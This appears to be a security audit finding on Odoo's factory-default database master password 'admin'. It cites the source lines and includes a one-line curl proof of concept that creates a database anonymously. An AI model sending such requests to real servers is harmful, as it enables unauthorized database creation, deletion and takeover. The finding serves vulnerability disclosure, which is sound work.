# Factory default master password admin

**Verification: CODE-VERIFIED**

## Description
config.py:207: parser.add_option(FileOnlyOption(dest="admin_passwd", my_default="admin")). Anonymous /web/database/* (auth="none", csrf=False) calls check_super(master_pwd) at database.py:133.

## Impact
Remote anonymous: create/delete databases. Restore from SQL dump = arbitrary SQL = complete takeover.

## PoC
```bash
curl -X POST http://<odoo>/web/database/create -d "master_pwd=admin&db_name=pwned&db_lang=en_US&db_password=test123"
```

## Execution result
```
Code path analysis: config.py:207 my_default=admin; database.py:133 check_super on auth=none route.
```
